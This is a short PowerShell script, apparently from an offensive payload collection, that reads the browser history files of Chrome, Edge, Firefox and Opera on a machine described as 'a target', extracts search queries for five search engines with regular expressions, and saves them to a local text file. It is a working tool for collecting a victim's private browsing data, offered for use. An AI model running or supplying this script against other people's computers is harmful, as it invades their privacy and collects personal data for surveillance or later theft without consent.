
<# ==================== Search History to File ======================

SYNOPSIS
Uses regular expressions to find common search engine recent search results and saves them to a file.

USAGE
1. Run the script on a target.
2. Open SearchHistory.txt for view the results.


#>


$Expressions = @{
    'google'     = 'https://www\.google\.[a-z]+/search\?.*?q=([^&]+)'
    'bing'       = 'https://www\.bing\.com/search\?.*?q=([^&]+)'
    'duckduckgo' = 'https://duckduckgo\.com/\?.*?q=([^&]+)'
    'yahoo'      = 'https://search\.yahoo\.com/search\?.*?p=([^&]+)'
    'baidu'      = 'https://www\.baidu\.com/s\?.*?wd=([^&]+)'
}

$Paths = @{
    'chrome_history'    = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\History"
    'edge_history'      = "$Env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default\History"
    'firefox_history'   = "$Env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release\places.sqlite"
    'opera_history'     = "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\History"
}

$Browsers = @('chrome', 'edge', 'firefox', 'opera')
$outpath = "SearchHistory.txt"

$existingEntries = if (Test-Path $outpath) { Get-Content $outpath } else { @() }
$uniqueEntries = @{}

foreach ($Browser in $Browsers) {
    $PathKey = "${Browser}_history"
    $Path = $Paths[$PathKey]
    
    if (Test-Path $Path) {
        $entries = Get-Content -Path $Path | Sort -Unique
        
        foreach ($SearchEngine in $Expressions.Keys) {
            $Expression = $Expressions[$SearchEngine]
            
            $matches = $entries | Select-String -AllMatches $Expression | % {($_.Matches).Value}
            
            $matches | ForEach-Object {
                $query = $_ -replace '.*[?&](q|p|wd)=([^&]+).*', '$2'
                $query = $query -replace '\s', '' -replace '\+', ' '
                
                $entry = "$Browser`t$SearchEngine`t$query"
                
                if (-not $uniqueEntries.ContainsKey($entry)) {
                    $uniqueEntries[$entry] = [PSCustomObject]@{
                        Browser      = $Browser
                        SearchEngine = $SearchEngine
                        SearchQuery  = $query
                    }
                }
            }
        }
    }
}
$uniqueEntries.Values | Format-Table -AutoSize | Out-File -FilePath $outpath
Write-Output "Saved to: $outpath"

